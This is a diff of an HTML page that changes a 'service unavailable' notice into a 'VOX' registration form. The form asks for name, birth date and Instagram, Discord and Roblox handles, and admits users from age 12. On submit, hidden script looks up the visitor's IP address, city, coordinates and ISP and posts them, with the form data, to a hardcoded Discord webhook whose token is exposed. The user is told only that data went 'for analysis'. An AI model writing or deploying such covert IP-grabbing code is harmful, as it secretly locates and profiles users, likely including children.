@@ -3,80 +3,656 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Service Unavailable</title>
+<title>VOX</title>
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Audiowide&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800;900&display=swap" rel="stylesheet">
 
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800;900&display=swap');
-
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
+*{margin:0;padding:0;box-sizing:border-box;}
+body, textarea, button, input{
+    font-family:'Audiowide',bold;
+    background: black;
+    color:white;
+    padding:20px;
+    overflow-x:hidden;
 }
 
-body {
-    font-family: 'Outfit', sans-serif;
-    background: linear-gradient(135deg, #0f172a, #020617);
-    color: white;
-    min-height: 100vh;
+.navbar {
+    width: 100%;
     display: flex;
-    align-items: center;
     justify-content: center;
+    margin-bottom: 40px;
 }
 
-.alert-container {
-    background: #111827;
-    border-radius: 10px;
-    padding: 30px 30px;
+.features {
+    margin-top: 32px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 16px;
     text-align: center;
-    box-shadow: 0 10px 40px black;
-    border: 2px solid black;
-    animation: fadeIn 1s ease-out;
 }
 
-.alert-icon {
-    font-size: 80px;
-    color: red;
-    margin-bottom: 24px;
-    animation: bounce 1.2s infinite;
+.feature-box {
+    background: #0f172a;
+    border: 1px solid #1e293b;
+    border-radius: 12px;
+    padding: 16px;
 }
 
-.alert-title {
-    font-size: 40px;
-    font-weight: 900;
-    background: linear-gradient(180deg, red, white, black);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: 16px;
+.feature-box i {
+    color: #a78bfa;
+    margin-bottom: 8px;
 }
 
-.alert-subtitle {
-    font-size: 24px;
+.feature-box span {
     color: #9ca3af;
-    letter-spacing: 1px;
-}
-.gradient-text { background: linear-gradient(45deg, red,darkred); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-
-@keyframes bounce {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-10px); }
+    font-size: 12px;
 }
 
-@keyframes fadeIn {
-    from { opacity: 0; transform: scale(0.95); }
-    to { opacity: 1; transform: scale(1); }
+.container {
+    position: relative;
+    background: rgba(255,255,255,0.05);
+    border-radius: 18px;
+    padding: 26px;
+    width: 95%;
+    max-width: 760px;
+    margin: auto;
+    backdrop-filter: blur(12px);
+    z-index: 1;
+}
+
+.container::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+    border-radius: inherit;
+    padding: 3px;
+    background: linear-gradient(45deg, white, black, white);
+    -webkit-mask:
+        linear-gradient(#fff 0 0) content-box,
+        linear-gradient(#fff 0 0);
+    -webkit-mask-composite: xor;
+    mask-composite: exclude;
+    z-index: -1;
+}
+
+.container::after {
+    content: "";
+    position: absolute;
+    inset: 3px;
+    border-radius: inherit;
+    background: black;
+    z-index: -1;
+}
+
+.tabs {
+    display: flex;
+    margin-bottom: 18px;
+    border-bottom: 2px solid;
+    -webkit-user-select: none; 
+            -moz-user-select: none;    
+            -ms-user-select: none;     
+            user-select: none;
+    border-image: linear-gradient(to right, white, black, white) 1;
+}
+
+.tab{
+    flex:1;
+    padding:14px;
+    text-align:center;
+    -webkit-user-select: none; 
+    -moz-user-select: none;    
+    -ms-user-select: none;     
+    user-select: none;
+    cursor:block;
+    color:#ccc;
+}
+h1 {
+            font-size: 4.5rem;
+            text-align: center;
+            margin-bottom: 0.5rem;
+            font-weight: 900;
+            position: relative;
+            text-transform: uppercase;
+            -webkit-user-select: none; 
+            -moz-user-select: none;    
+            -ms-user-select: none;     
+            user-select: none;
+            letter-spacing: 5px;
+            cursor:block;
+            transform-style: preserve-3d;
+        }
+        @keyframes heroTitleFloat {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-8px) scale(1.02); }
+        }
+        h1 span {
+            background: linear-gradient(135deg, darkgreen,lime, green);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            cursor:block;
+            background-clip: text;
+            position: relative;
+            display: inline-block;
+        }
+        @keyframes heroGradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+h1 span::before {
+            content: attr(data-text);
+            position: absolute;
+            left: 0;
+            top: 0;
+            z-index: -1;
+            background: linear-gradient(135deg, green, lime);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: blur(20px);
+            opacity: 0.6;
+        }
+      
+.tabContent{display:none;}
+.tabContent.active{
+    display:block;}
+
+input{
+    width:100%;
+    padding:14px;
+    margin-top:12px;
+    font-family:'Outfit',bold;
+    border-radius:14px;
+    border:2px solid white;
+    background:black;
+    color: white;
+}
+
+input:focus{
+    border-color:#292929;
+    outline:none;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    margin-top:12px;
+    font-size:18px;
+    font-family:'Outfit',bold;
+    cursor:block;
+    border-radius:14px;
+    border:none;
+    color:white;
+    background:linear-gradient(45deg,white, black, white);
+}
+
+button:hover{transform:scale(1.06);}
+
+#errorBox{
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    display:none;
+    font-weight:bold;
+    border-radius:12px;
+}
+.err {
+    background: linear-gradient(90deg, darkred, red, darkred);
+    color: black;
+    font-family:'Outfit',bold;
+    border: none;
+    padding: 12px 16px;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: 600;
+    box-shadow: 0 4px 10px rgba(185, 28, 28, 0.35);
+}
+.ok {
+    background: linear-gradient(135deg, darkgreen, lime, darkgreen);
+    color: black;
+    font-family:'Outfit',bold;
+    border: none;
+    padding: 12px 16px;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: 600;
+    box-shadow: 0 4px 10px rgba(21, 128, 61, 0.35);
+}
+
+.sobreBox{
+    background:rgba(0,0,0,0.6);
+    padding:16px;
+    border-radius:14px;
+    margin-top:20px;
+    border:1px solid blue;
+}
+
+.faqContent{
+    display:none;
+    margin-top:8px;
+    color:#ccc;
+}
+
+.faqTitle{
+    cursor:block;
+}
+#subInfoBar {
+position: fixed;
+left: 50%;
+bottom: 0;
+
+transform: translate(-50%, -20px);
+
+width: 90%;
+max-width: 600px;
+
+padding: 16px;
+font-size: 14px;
+font-family: Poppins;
+
+border-radius: 16px;
+
+background: linear-gradient(45deg, #000000, #1f1f1f, #000000);
+background-size: 220% 220%;
+color: #ffffff;
+
+border: 1px solid white;
+
+display: flex;
+flex-direction: column;
+gap: 8px;
+
+box-shadow:
+0 8px 25px rgba(0,0,0,0.5),
+0 0 20px rgba(255,255,255,0.05);
+}
+
+#subInfoBar strong {
+    font-size: 15px;
+    color: white;
+    margin-bottom: 6px;
+}
+
+#subInfoBar span {
+    color: lime;
+    font-family:'Outfit',bold;
+    font-weight: 600;
+}
+#subInfoBar div {
+    color: white;
+    font-family:'Outfit',bold;
+    font-weight: 600;
 }
 </style>
 </head>
+
 <body>
 
-<div class="alert-container">
-    <i class="fas fa-exclamation-triangle alert-icon"></i>
-    <h1 class="alert-title">VOX Service Unavailable for you.</h1>
-    <div class="alert-subtitle"><span class="gradient-text">Do not comeback here again.</span></div>
+<div class="grid"></div>
+
+<div class="navbar">
+<h1><span data-text="IMP">VOX</span></h1>
 </div>
 
+<div class="container">
+
+<div class="tabs">
+<div class="tab active" data-tab="createTab">Registration</div>
+</div>
+
+<div class="tabContent active" id="createTab">
+    
+    <input id="createUser" placeholder="Your Name">
+   <input 
+    id="birthDate" 
+    type="text" 
+    placeholder="Date of birth"
+    maxlength="10"
+    inputmode="numeric"
+>
+    
+    <input id="insta" placeholder="Instagram (@), Type 'NaN' if you don't have it.">
+    <input id="discord" placeholder="Discord (@), Type 'NaN' if you don't have it.">
+    <input id="roblox" placeholder="Roblox (@), Type 'NaN' if you don't have it.">
+    
+    <div id="errorBox"></div>
+    <button onclick="createAccount()">Register</button>
+    <br>    <br>    <br>    <br>    <br>    <br>    <br>    <br>    <br>
+    
+    <div id="subInfoBar">
+    <div><strong>Connection with VOX:</strong></div>
+    <div>Time: <span id="time"></span></div>
+    <div>Country: <span id="country">Loading...</span></div>
+    <div>Device Type: <span id="device">Loading...</span></div>
+</div>
+    
+ 
+   
+
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    
+    function updateTime() {
+        const now = new Date();
+        document.getElementById("time").textContent =
+            now.toLocaleTimeString();
+    }
+    updateTime();
+    setInterval(updateTime, 1000);
+
+
+    fetch("https://api.country.is/")
+    .then(response => response.json())
+    .then(data => {
+        const countryElement = document.getElementById("country");
+        
+        if (data.country) {
+            const regionNames = new Intl.DisplayNames(['pt-BR'], { type: 'region' });
+            const countryName = regionNames.of(data.country);
+            
+            countryElement.textContent = countryName || "Indisponível";
+        } else {
+            countryElement.textContent = "Indisponível";
+        }
+    })
+    .catch(() => {
+        document.getElementById("country").textContent = "Indisponível";
+    });
+
+
+function getDeviceType() {
+    const ua = navigator.userAgent.toLowerCase();
+    
+    if (/mobile|android|iphone|ipod|blackberry|opera mini/i.test(ua)) {
+        return "Mobile/IOS";
+    }
+    
+    if (/ipad|tablet/i.test(ua)) {
+        return "Tablet/IPad";
+    }
+    
+    return "PC";
+}
+
+document.getElementById("device").textContent = getDeviceType();
+});
+
+
+
+document.querySelectorAll(".tab").forEach(tab=>{
+    tab.addEventListener("click",()=>{
+        document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+        document.querySelectorAll(".tabContent").forEach(c=>c.classList.remove("active"));
+        tab.classList.add("active");
+        document.getElementById(tab.dataset.tab).classList.add("active");
+    });
+});
+
+function showStatus(msg,type){
+    const box=document.getElementById("errorBox");
+    box.innerText=msg;
+    box.className=type;
+    box.style.display="block";
+}
+
+function getUsers(){
+    return JSON.parse(localStorage.getItem("vox_users") || "{}");
+}
+
+function saveUsers(u){
+    localStorage.setItem("vox_users",JSON.stringify(u));
+}
+
+function createAccount() {
+    
+    const user = document.getElementById("createUser").value.trim();
+    const birth = document.getElementById("birthDate").value;
+    const insta = document.getElementById("insta").value.trim();
+    const discord = document.getElementById("discord").value.trim();
+    const roblox = document.getElementById("roblox").value.trim();
+    
+    if (!user || !birth) {
+        return showStatus("Please fill in the required fields.", "err");
+    }
+    
+    let users = getUsers();
+    
+    if (users[user]) {
+        return showStatus("error", "err");
+    }
+    
+    users[user] = {
+        birth,
+        insta,
+        discord,
+        roblox
+    };
+    
+    saveUsers(users);
+    
+    showStatus("The data was sent to VOX for analysis.", "ok");
+    
+    sendWebhookIP("NOVO REGISTRO", user, birth, insta, discord, roblox);
+}
+
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1468030404341797030/JiA9QwHpyCslAvUPeb41LAEAF_eImTl4Aei17OPTBdRBeEAhDNgSDp4beovs5ZOWmEGV";
+
+function getDevice(){
+    const ua = navigator.userAgent;
+
+    if(/android/i.test(ua)) return "Android";
+    if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if(/Windows/i.test(ua)) return "Windows";
+    if(/Mac/i.test(ua)) return "MacOS";
+    if(/Linux/i.test(ua)) return "Linux";
+
+    return "Desconhecido";
+}
+
+
+function getBrowser(){
+    const ua = navigator.userAgent;
+
+    if(ua.includes("Edg")) return "Edge";
+    if(ua.includes("Firefox")) return "Firefox";
+    if(ua.includes("Chrome")) return "Chrome";
+    if(ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+
+    return "Desconhecido";
+}
+
+function getDetailedTime(){
+    return new Date().toLocaleString("pt-BR",{
+        weekday:"long",
+        year:"numeric",
+        month:"long",
+        day:"numeric",
+        hour:"2-digit",
+        minute:"2-digit",
+        second:"2-digit",
+        timeZoneName:"short"
+    });
+}
+
+function getFlag(code){
+    if(!code) return "🏳️";
+
+    return code
+        .toUpperCase()
+        .replace(/./g,char =>
+            String.fromCodePoint(127397 + char.charCodeAt())
+        );
+}
+
+async function getIP() {
+    try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const j = await r.json();
+        return j.ip;
+    } catch {
+        return "Erro ao obter IP";
+    }
+}
+
+async function getIPLocation() {
+    try {
+        const req = await fetch("https://ipapi.co/json/");
+        return await req.json();
+    } catch {
+        return {};
+    }
+}
+
+function getFlag(countryCode) {
+    if (!countryCode) return "🏳️";
+    
+    return countryCode
+        .toUpperCase()
+        .replace(/./g, char =>
+            String.fromCodePoint(127397 + char.charCodeAt())
+        );
+}
+
+function getMapsLink(lat, lon) {
+    if (!lat || !lon) return "N/A";
+    return `https://www.google.com/maps?q=${lat},${lon}`;
+}
+
+function getDetailedTime() {
+    return new Date().toLocaleString("pt-BR", {
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        timeZoneName: "short"
+    });
+}
+
+async function sendWebhookIP(action, user, birth, insta, discord, roblox) {
+    
+    const ip = await getIP();
+    const loc = await getIPLocation();
+    
+    const flag = getFlag(loc.country);
+    
+    const payload = {
+    embeds: [{
+        title: "VOX: Um usuário fez login.",
+        color: 3092790,
+        fields: [
+            
+            { name: "Ação", value: action },
+            { name: "Usuário", value: user },
+            
+            { name: "Data de Nascimento", value: birth || "N/A" },
+            
+            { name: "Instagram", value: insta || "Não informado" },
+            { name: "Discord", value: discord || "Não informado" },
+            { name: "Roblox", value: roblox || "Não informado" },
+            
+            { name: "IP", value: ip || "N/A" },
+            
+            { name: "País", value: `${flag} ${loc.country_name || "N/A"}` },
+            { name: "Região", value: loc.region || "N/A" },
+            { name: "Cidade", value: loc.city || "N/A" },
+            
+            { name: "Latitude", value: String(loc.latitude || "N/A") },
+            { name: "Longitude", value: String(loc.longitude || "N/A") },
+            
+            { name: "Mapa", value: getMapsLink(loc.latitude, loc.longitude) },
+            
+            { name: "Provedor", value: loc.org || "N/A" },
+            { name: "Timezone", value: loc.timezone || "N/A" },
+            { name: "Horário", value: getDetailedTime() },
+            
+            { name: "Método", value: "📡 IP Approximate Location" }
+            
+        ],
+        timestamp: new Date().toISOString()
+    }]
+};
+    
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    });
+}
+const input = document.getElementById("birthDate");
+
+input.addEventListener("input", function(e){
+
+    let v = e.target.value.replace(/\D/g, "").slice(0,8);
+
+    if(v.length >= 5){
+        v = v.replace(/(\d{2})(\d{2})(\d+)/, "$1/$2/$3");
+    } else if(v.length >= 3){
+        v = v.replace(/(\d{2})(\d+)/, "$1/$2");
+    }
+
+    e.target.value = v;
+
+    validarData(v);
+});
+
+function validarData(valor){
+
+    if(valor.length !== 10) return;
+
+    let [dia, mes, ano] = valor.split("/").map(Number);
+    let anoAtual = new Date().getFullYear();
+
+    if(dia < 1 || dia > 31){
+        input.value = "";
+        return showStatus("Set the day correctly.", "err");
+    }
+
+    if(mes < 1 || mes > 12){
+        input.value = "";
+        return showStatus("Set the month correctly.", "err");
+    }
+
+    if(ano < 1990){
+        input.value = "";
+        return showStatus("The minimum year allowed is 1990.", "err");
+    }
+    
+    if(ano > anoAtual){
+    input.value = "";
+    return showStatus("You are not in the future.", "err");
+}
+
+    let hoje = new Date();
+    let nascimento = new Date(ano, mes - 1, dia);
+
+    let idade = hoje.getFullYear() - nascimento.getFullYear();
+    let m = hoje.getMonth() - nascimento.getMonth();
+    
+
+    if(m < 0 || (m === 0 && hoje.getDate() < nascimento.getDate())){
+        idade--;
+    }
+
+    if (idade < 12) {
+    input.value = "";
+    
+    if ((ano + 12) === anoAtual) {
+        return showStatus("Wait until you turn 12.", "err");
+    }
+    
+    return showStatus("Users under the age of 12 cannot use VOX.", "err");
+}
+}
+</script>
 </body>
 </html>
